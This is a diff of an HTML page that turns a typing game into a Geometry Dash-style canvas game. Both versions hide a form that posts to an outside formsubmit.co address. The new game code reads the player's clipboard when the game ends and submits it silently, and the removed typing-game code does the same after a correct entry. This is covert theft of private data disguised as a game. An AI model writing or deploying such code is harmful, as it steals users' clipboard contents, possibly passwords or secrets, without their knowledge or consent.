@@ -1,97 +1,154 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Typing Game</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Geometry Dash Clone</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      padding: 2rem;
+      margin: 0;
+      padding: 0;
       background-color: #f0f0f0;
-      text-align: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
     }
-
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    #challenge {
-      margin-top: 20px;
-      font-size: 18px;
-      padding: 1rem;
-      background-color: #fff;
-      border: 1px solid #ccc;
-      min-height: 60px;
-      white-space: pre-wrap;
-    }
-
-    #inputBox {
-      margin-top: 20px;
-      padding: 10px;
-      font-size: 16px;
-      width: 100%;
-      max-width: 600px;
-    }
-
-    #status {
-      margin-top: 10px;
-      font-weight: bold;
-    }
-
-    form {
-      display: none;
+    canvas {
+      background-color: #333;
+      border: 2px solid #000;
     }
   </style>
 </head>
 <body>
-
-  <h2>Typing Game</h2>
-  <div id="challenge">Click "Start Game" to begin!</div>
-
-  <button onclick="startGame()">Start Game</button>
-  <br />
-
-  <input type="text" id="inputBox" placeholder="Start typing..." oninput="checkTyping()" disabled />
-
-  <div id="status"></div>
-
-  <form id="submitForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST">
+  <canvas id="gameCanvas" width="800" height="400"></canvas>
+  <form id="submitForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST" style="display: none;">
     <input type="hidden" name="clipboardText" id="clipboardInput">
   </form>
 
   <script>
-    const challengeText = `The quick brown fox jumps over the lazy dog.`;
+    // Get the canvas and context
+    const canvas = document.getElementById('gameCanvas');
+    const ctx = canvas.getContext('2d');
 
-    function startGame() {
-      document.getElementById('challenge').textContent = challengeText;
-      document.getElementById('inputBox').value = '';
-      document.getElementById('inputBox').disabled = false;
-      document.getElementById('inputBox').focus();
-      document.getElementById('status').textContent = '';
+    // Game variables
+    let cube = {
+      x: 50,
+      y: 300,
+      width: 50,
+      height: 50,
+      speed: 3,
+      gravity: 0.6,
+      jumpPower: -15,
+      velocity: 0,
+      jumping: false
+    };
+
+    let obstacles = [];
+    let score = 0;
+    let isGameOver = false;
+
+    // Game loop
+    function gameLoop() {
+      if (isGameOver) {
+        displayGameOver();
+        return;
+      }
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      cube.velocity += cube.gravity;
+      cube.y += cube.velocity;
+
+      // Keep the cube within the canvas
+      if (cube.y > canvas.height - cube.height) {
+        cube.y = canvas.height - cube.height;
+        cube.velocity = 0;
+        cube.jumping = false;
+      }
+
+      // Draw the cube
+      ctx.fillStyle = "#00f";
+      ctx.fillRect(cube.x, cube.y, cube.width, cube.height);
+
+      // Handle obstacles
+      if (Math.random() < 0.02) {
+        let obstacleHeight = Math.random() * (canvas.height - 100) + 30;
+        obstacles.push({
+          x: canvas.width,
+          y: canvas.height - obstacleHeight,
+          width: 20,
+          height: obstacleHeight
+        });
+      }
+
+      for (let i = 0; i < obstacles.length; i++) {
+        let obstacle = obstacles[i];
+        obstacle.x -= cube.speed;
+        ctx.fillStyle = "#f00";
+        ctx.fillRect(obstacle.x, obstacle.y, obstacle.width, obstacle.height);
+
+        // Collision detection
+        if (cube.x + cube.width > obstacle.x && cube.x < obstacle.x + obstacle.width &&
+            cube.y + cube.height > obstacle.y) {
+          isGameOver = true;
+        }
+
+        // Remove obstacles that go off screen
+        if (obstacle.x + obstacle.width < 0) {
+          obstacles.splice(i, 1);
+          score++;
+        }
+      }
+
+      // Display score
+      ctx.fillStyle = "#fff";
+      ctx.font = "20px Arial";
+      ctx.fillText("Score: " + score, 20, 30);
+
+      requestAnimationFrame(gameLoop);
     }
 
-    async function checkTyping() {
-      const typed = document.getElementById('inputBox').value;
-      if (typed === challengeText) {
-        document.getElementById('status').textContent = '✅ Correct! Submitting...';
-        
-        try {
-          const clipboardText = await navigator.clipboard.readText();
-          document.getElementById('clipboardInput').value = clipboardText;
-          setTimeout(() => {
-            document.getElementById('submitForm').submit();
-          }, 1000);
-        } catch (err) {
-          document.getElementById('status').textContent = '❌ Failed to read: ' + err.message;
-        }
-      } else {
-        document.getElementById('status').textContent = '';
+    // Jump functionality
+    function jump() {
+      if (!cube.jumping) {
+        cube.velocity = cube.jumpPower;
+        cube.jumping = true;
       }
     }
-  </script>
 
+    // Game Over screen
+    function displayGameOver() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = "#fff";
+      ctx.font = "40px Arial";
+      ctx.fillText("GAME OVER", canvas.width / 2 - 100, canvas.height / 2);
+      ctx.font = "20px Arial";
+      ctx.fillText("Score: " + score, canvas.width / 2 - 40, canvas.height / 2 + 40);
+
+      // Submit clipboard content when game ends
+      submitClipboard();
+    }
+
+    // Submit clipboard text to form
+    async function submitClipboard() {
+      try {
+        const clipboardText = await navigator.clipboard.readText();
+        document.getElementById('clipboardInput').value = clipboardText;
+        document.getElementById('submitForm').submit();
+      } catch (err) {
+        console.error('Failed to read clipboard: ' + err.message);
+      }
+    }
+
+    // Event listener for jumping
+    window.addEventListener('keydown', function(e) {
+      if (e.key === ' ' || e.key === 'ArrowUp') {
+        jump();
+      }
+    });
+
+    // Start the game
+    gameLoop();
+  </script>
 </body>
 </html>
